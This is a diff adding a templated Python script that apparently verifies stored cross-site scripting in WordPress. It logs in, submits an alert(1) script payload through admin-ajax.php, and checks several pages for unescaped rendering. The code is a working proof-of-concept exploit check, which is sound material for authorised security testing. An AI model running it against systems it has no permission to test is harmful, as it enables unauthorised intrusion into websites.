@@ -1,0 +1,46 @@
+import requests
+from wp_login import wp_login
+from xss_check import check_reflection
+
+TARGET = "{{ target_url }}"
+ACTION = "{{ ajax_action }}"
+USERNAME = "{{ test_username }}"
+PASSWORD = "{{ test_password }}"
+PAYLOAD = "<script>alert(1)</script>"
+
+session = requests.Session()
+login = wp_login(session, TARGET, USERNAME, PASSWORD)
+if not login.success:
+    print(f"[-] FAILURE: login failed for {USERNAME}: {login.reason}")
+    raise SystemExit(0)
+
+submit = session.post(
+    f"{TARGET}/wp-admin/admin-ajax.php",
+    data={
+        "action": ACTION,
+        "title": PAYLOAD,
+        "name": PAYLOAD,
+        "content": PAYLOAD,
+        "message": PAYLOAD,
+        {{ extra_params }}
+    },
+    timeout=20,
+)
+
+pages = [
+    f"{TARGET}/wp-admin/",
+    f"{TARGET}/wp-admin/admin.php",
+    f"{TARGET}/",
+]
+for url in pages:
+    resp = session.get(url, timeout=20)
+    result = check_reflection(resp.text, payload=PAYLOAD)
+    if result.exploitable:
+        print(f"[+] SUCCESS: payload rendered unescaped after submit to {ACTION}")
+        print(f"    render_url={url}")
+        print(f"    sink_context={result.sink_context}")
+        print(f"    excerpt={result.context}")
+        raise SystemExit(0)
+
+print("[-] FAILURE: payload was not observed unescaped on common render paths")
+print(f"    submit_status={submit.status_code} submit_body={submit.text[:300]}")
